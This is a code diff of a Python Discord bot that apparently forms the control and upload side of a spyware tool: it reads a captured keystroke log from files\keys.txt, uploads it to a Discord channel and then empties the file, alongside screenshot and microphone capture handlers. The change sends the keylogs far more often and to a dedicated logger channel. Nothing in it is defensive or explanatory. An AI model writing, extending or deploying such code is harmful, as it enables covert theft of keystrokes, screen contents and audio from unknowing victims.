@@ -4,6 +4,7 @@ from screen import Screenshot, Microphone
 from dotenv import load_dotenv
 load_dotenv(".env")
 
+keylogs_file = "files\\keys.txt"
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix=';', intents=intents)
 
@@ -53,14 +54,13 @@ async def sendScreen(ctx):
             time.sleep(0.1)
 
 async def sendLogs(ctx):
-    logs_path = r"files\keys.txt"
     guild = await bot.fetch_guild(guild_id)
-    channel = await guild.fetch_channel(screenshot_channel)
+    channel = await guild.fetch_channel(logger_channel)
 
-    with open(logs_path, 'rb') as logs_file:
-        await channel.send(file=discord.File(logs_file, logs_path)) 
+    with open(keylogs_file, 'rb') as logs_file:
+        await channel.send(file=discord.File(logs_file, keylogs_file)) 
 
-    with open(logs_path, "w") as f:
+    with open(keylogs_file, "w") as f:
         f.write("")
             
 @bot.event
@@ -81,12 +81,11 @@ async def on_message(message):
                 await sendScreen(ctx=message)
             if file.endswith(".wav"):
                 await sendMic(ctx=message)
-            if file.endswith(".txt"):
-                with open(r"files\keys.txt", "r") as f:
-                    logs = f.readlines()
-                    for lines in logs:
-                        if "SEC: 300" in lines:
-                            await sendLogs(ctx=message)
+            with open(keylogs_file, "r") as f:
+                logs = f.readlines()
+                for lines in logs:
+                    if "SEC: 5" in lines:
+                        await sendLogs(ctx=message)
 
         time.sleep(0.1)
 
